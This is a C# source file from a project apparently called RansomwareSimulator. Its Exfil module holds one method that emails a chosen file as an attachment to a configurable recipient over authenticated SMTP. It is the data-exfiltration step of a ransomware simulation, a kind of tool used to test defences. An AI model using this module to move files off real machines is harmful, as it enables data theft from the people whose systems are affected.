using System;
using System.Collections.Generic;
using System.Net.Mail;
using System.Text;

namespace RansomwareSimulator.Exfil
{
    public static class Email
    {
        public static void Send(string SmtpServer, int port, string sender, string reciever, string smtpUser, string pwd, string file)
        {

            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
            MailMessage mail = new MailMessage();
            SmtpClient srv = new SmtpClient(SmtpServer);
            mail.From = new MailAddress(sender);
            mail.To.Add(reciever);
            mail.Subject = string.Format(Helper.Consts.EmailSubject, file);
            mail.Body = string.Format(Helper.Consts.EmailSubject, file);

            Attachment attachment;
            attachment = new Attachment(file);
            mail.Attachments.Add(attachment);
            srv.Port = port;
            srv.Credentials = new System.Net.NetworkCredential(smtpUser, pwd);
            srv.EnableSsl = true;
            srv.Send(mail);

        }
    }
}
